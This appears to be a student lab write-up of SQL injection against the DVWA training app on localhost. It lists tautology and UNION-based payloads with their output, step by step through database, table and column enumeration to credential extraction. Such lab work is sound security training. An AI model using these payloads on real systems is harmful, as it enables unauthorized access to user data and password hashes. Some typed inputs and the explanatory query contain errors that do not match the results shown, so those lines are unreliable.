# SQL Injection – Attack Steps

## Target
- Application: DVWA
- Module: SQL Injection
- Security Level: LOW
- URL: http://localhost/DVWA/vulnerabilities/sqli/

## Step 1: Identify Injection Point
- Input field: User ID
- Parameter is directly reflected in SQL query
- No input sanitization observed

## Step 2: Test for SQL Injection
Input: 1' OR '1'='1
Explanation:

because if query is "SELECT * FROM table_name WHERE user_id='my_input'
after above input
"SELECT * FROM table_name WHERE username ='1 OR'1'='1'"

Result:
```
ID: 1' OR '1'='1
First name: admin
Surname: admin
ID: 1' OR '1'='1
First name: Gordon
Surname: Brown
ID: 1' OR '1'='1
First name: Hack
Surname: Me
ID: 1' OR '1'='1
First name: Pablo
Surname: Picasso
ID: 1' OR '1'='1
First name: Bob
Surname: Smith
```
- Application returned all user records
- Confirms SQL Injection vulnerability

## Step 3: Database Enumeration
Input: 1'UNION SELECT database(), user() #

Result:
```
ID: 1' UNION SELECT database(), user() #
First name: dvwa
Surname: dvwa@localhost
```
- Database name identified as `dvwa`
- Current DB user identified

## Step 4: Table Enumeration
Input: 1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE tables_schema='dvwa' #

Result:
```
ID: 1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='dvwa' #
First name: users
Surname: 
ID: 1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='dvwa' #
First name: access_log
Surname: 
ID: 1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='dvwa' #
First name: guestbook
Surname: 
ID: 1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='dvwa' #
First name: security_log
Surname
```
- Identified table: `users`

## Step 5: Column Enumeration
Input: 1'UNION SELECT columns_name, NULL from information_schema.tables WHERE tables_name='users' #

Result:
```
ID: 1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE  table_name = 'users' #
First name: USER
Surname: 
ID: 1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE  table_name = 'users' #
First name: PASSWORD_ERRORS
Surname: 
ID: 1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE  table_name = 'users' #
First name: PASSWORD_EXPIRATION_TIME
Surname: 
ID: 1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE  table_name = 'users' #
First name: user_id
Surname: 
ID: 1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE  table_name = 'users' #
First name: first_name
Surname: 
ID: 1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE  table_name = 'users' #
First name: last_name
Surname: 
ID: 1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE  table_name = 'users' #
First name: password
Surname: 
ID: 1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE  table_name = 'users' #
First name: avatar
Surname: 
ID: 1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE  table_name = 'users' #
First name: last_login
Surname: 
ID: 1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE  table_name = 'users' #
First name: failed_login
Surname: 
ID: 1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE  table_name = 'users' #
First name: role
Surname: 
ID: 1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE  table_name = 'users' #
First name: account_enabled
Surname
```
- Columns identified: user, password

## Step 6: Extract Credentials
Input: 1' UNION SELECT user, password FROM users #

Result:
- Extracted usernames and password hashes successfully

